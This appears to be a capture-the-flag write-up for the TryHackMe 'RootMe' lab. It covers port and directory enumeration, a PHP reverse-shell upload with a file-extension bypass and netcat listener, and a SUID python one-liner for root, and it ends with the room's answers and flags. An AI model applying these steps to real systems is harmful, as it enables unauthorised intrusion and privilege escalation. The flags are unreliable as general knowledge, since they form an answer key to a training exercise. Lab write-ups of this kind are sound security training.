# THM - RootMe
**security - web - linux - privilege-escalation**

## Enumeration
IP Address : 10.10.234.144
### 1.1 
#### nmap
**nmap -A 10.10.234.144**
	- 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	- 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
### 1.2 
#### gobuster
**gobuster dir -u http://10.10.234.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
    - /uploads => we can see files uploaded
    - /css
    - /js
    - /panel => it is possible to upload files
### Conclusion, vulnerabilities
2 open ports, 80  work with Apache, and /panel possibly weak for reverse shell in php

## Exploit
### 1.1
#### reverse shell
**nc -nlap 1337**
Start home server who listen. 
Dl a php reverse shell and put my ip address (ifconfig).
Test differtents extensions files like .php5.
Go to /upload and execute payload.
In homer server : **locate *.txt** and find /var/www/user.txt
### Conclusion
Payload can be uploaded and executed in a simply way, use locate to find the first flag.

## Privilege escalation
### 1.1
#### sudo
Search files with SUID : **find . -perm /4000
    - /usr/bin/python
Search to GTFOBins "python" and find 
    - ./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
**cat root/root.txt**

## Responses
### Scan the machine, how many ports are open? : 
**2**
### What version of Apache is running? : 
**2.4.29**
### What service is running on port 22? : 
**SSH**
### What is the hidden directory?? : 
**/panel/**
### user.txt : 
**THM{y0u_g0t_a_sh3ll}**
### Search for files with SUID permission, which file is weird? : 
**/usr/bin/python**
### root.txt : 
**THM{pr1v1l3g3_3sc4l4t10n}**